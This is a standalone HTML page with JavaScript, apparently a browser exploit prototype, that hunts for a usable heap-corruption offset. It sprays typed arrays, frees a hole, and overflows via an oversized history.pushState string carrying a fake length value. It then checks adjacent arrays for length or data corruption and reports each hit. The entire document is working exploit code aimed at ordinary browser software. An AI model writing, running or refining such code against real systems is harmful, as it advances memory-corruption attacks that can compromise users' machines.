<!DOCTYPE html>
<html>
<head>
    <title>Sliding Scale: Offset Hunter</title>
    <style>
        body { background: #000; color: #aaa; font-family: monospace; padding: 20px; }
        .log { border: 1px solid #444; height: 350px; overflow-y: scroll; padding: 10px; background: #111; color: #fff; margin-bottom: 15px;}
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; }
        button { 
            padding: 10px; font-weight: bold; cursor: pointer; 
            background: #222; color: #fff; border: 1px solid #555; 
        }
        button:hover { background: #fff; color: #000; }
        .found { background: #0f0; color: #000; }
    </style>
</head>
<body>
    <h1>OFFSET HUNTER</h1>
    <p>Base: 709518 | Hole: 168 | Payload: 0x00002000 (8192)</p>

    <div id="logger" class="log">Inicie a varredura...</div>

    <div class="grid">
        <button onclick="runSlide(0)">Offset 0 (Header)</button>
        <button onclick="runSlide(4)">Offset 4</button>
        <button onclick="runSlide(8)">Offset 8</button>
        <button onclick="runSlide(12)">Offset 12 (Comum)</button>
        <button onclick="runSlide(16)">Offset 16 (Butterfly?)</button>
        <button onclick="runSlide(20)">Offset 20</button>
        <button onclick="runSlide(24)">Offset 24</button>
        <button onclick="runSlide(28)">Offset 28</button>
        <button onclick="runSlide(32)">Offset 32</button>
        <button onclick="runSlide(36)">Offset 36</button>
    </div>

    <script>
        const logger = document.getElementById('logger');
        const BASE_SIZE = 709518; 
        const HOLE_SIZE = 168;    
        const SPRAY_SIZE = 6000;
        const MAGIC_NUM = 0x41414141;

        var spray = [];

        function log(msg, type) {
            const d = document.createElement('div');
            d.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
            if(type=='success') { d.style.color = '#0f0'; d.style.fontWeight = 'bold'; }
            logger.appendChild(d);
            logger.scrollTop = logger.scrollHeight;
        }

        async function runSlide(offset) {
            log("---------------------------------------");
            log(`TESTANDO OFFSET: ${offset} bytes`);
            
            // Limpeza
            spray = null;
            if(window.gc) window.gc();
            await new Promise(r => setTimeout(r, 200));
            spray = [];

            // Spray
            for(let i=0; i < SPRAY_SIZE; i++) {
                let arr = new Uint32Array(1024);
                arr[0] = MAGIC_NUM; 
                arr[1] = i; 
                // Colocamos marcadores extras para ver onde estamos acertando
                arr[2] = 0xDEADBEEF; 
                spray.push(arr);
            }

            // Buraco
            let center = 3000;
            for(let i=0; i < HOLE_SIZE; i++) {
                spray[center + i] = null;
            }

            log("Aguardando GC...");
            await new Promise(r => setTimeout(r, 800));

            try {
                // Base
                let base = new Array(BASE_SIZE + 1).join('A');
                
                // Construção do Payload Deslizante
                // 1. Padding de Zeros (Seguro) até o offset
                let padding = "";
                if(offset > 0) padding = new Array(offset + 1).join("\x00");
                
                // 2. O Valor Mágico (Little Endian: 00 20 00 00 -> 0x00002000)
                // Usamos 0x20 porque você confirmou que é seguro.
                let fakeLength = "\x00\x20\x00\x00"; 
                
                // 3. Padding final para garantir overwrite (Zeros)
                let tail = new Array(32).join("\x00");

                let payload = base + padding + fakeLength + tail;

                history.pushState({}, "pwn_" + offset + "_" + Date.now(), payload);
                
                checkCorruption(HOLE_SIZE, center, offset);

            } catch(e) {
                log("ERRO: " + e.message);
            }
        }

        function checkCorruption(holeUsed, startIdx, offset) {
            let found = false;
            let limit = startIdx + holeUsed + 60;

            for(let i = startIdx + holeUsed; i < limit; i++) {
                if (i >= spray.length) break;
                let arr = spray[i];
                if(arr) {
                    // 1. CHECAGEM DE LENGTH (Ouro)
                    if(arr.length !== 1024) {
                        found = true;
                        reportSuccess(i, "LENGTH CHANGE", `Offset ${offset} acertou! Novo Length: ${arr.length}`);
                        return;
                    }

                    // 2. CHECAGEM DE CONTEÚDO (Prata)
                    // Se arr[0] deixar de ser MAGIC_NUM, nós sobrescrevemos os dados!
                    if(arr[0] !== MAGIC_NUM) {
                        found = true;
                        let val = arr[0];
                        // Se for 0, é ótimo (sobrescrevemos com zeros)
                        // Se for 0x2000, melhor ainda (acertamos o dado com nosso payload)
                        reportSuccess(i, "DATA OVERWRITE", `Offset ${offset} acertou os dados! Valor: 0x${val.toString(16)}`);
                        return;
                    }
                    
                    // 3. CHECAGEM DE QUEBRA (Bronze)
                    // Se o array ficou inutilizável (tamanho 0 ou undefined)
                    if(arr.length === 0 || arr.length === undefined) {
                         found = true;
                         reportSuccess(i, "OBJECT KILL", `Offset ${offset} matou o objeto.`);
                         return;
                    }
                }
            }
            if(!found) log(`Offset ${offset}: Nada mudou.`);
        }

        function reportSuccess(idx, type, msg) {
            document.body.style.background = "#004400";
            log(`!!! SUCESSO (${type}) !!!`, 'success');
            log(msg, 'success');
            alert(`BINGO!\nType: ${type}\n${msg}`);
        }
    </script>
</body>
</html>
